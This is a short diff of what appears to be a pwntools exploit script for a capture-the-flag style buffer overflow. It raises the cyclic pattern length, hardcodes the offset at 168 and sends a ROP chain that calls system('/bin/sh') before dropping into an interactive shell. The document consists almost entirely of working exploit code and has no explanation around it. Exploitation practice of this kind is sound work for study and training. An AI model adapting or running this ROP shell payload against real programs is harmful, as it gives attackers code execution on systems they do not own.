@@ -22,7 +22,7 @@ libc = elf.libc
 
 def get_offset():
     io = process()
-    io.sendline(cyclic(200))
+    io.sendline(cyclic(300))
     io.wait()
     core = Coredump('core')
     if context.arch == 'i386':
@@ -40,7 +40,7 @@ def get_ropchain():
 
     return rop.chain()
 
-offset = get_offset()
+offset = 168#get_offset()
 
 rop_chain = get_ropchain()
 
@@ -73,6 +73,5 @@ rop.system(bin_sh)
 info(rop.dump())
 payload2 = flat({offset:rop.chain()})
 io.sendline(payload2)
-
 io.interactive()
 ```
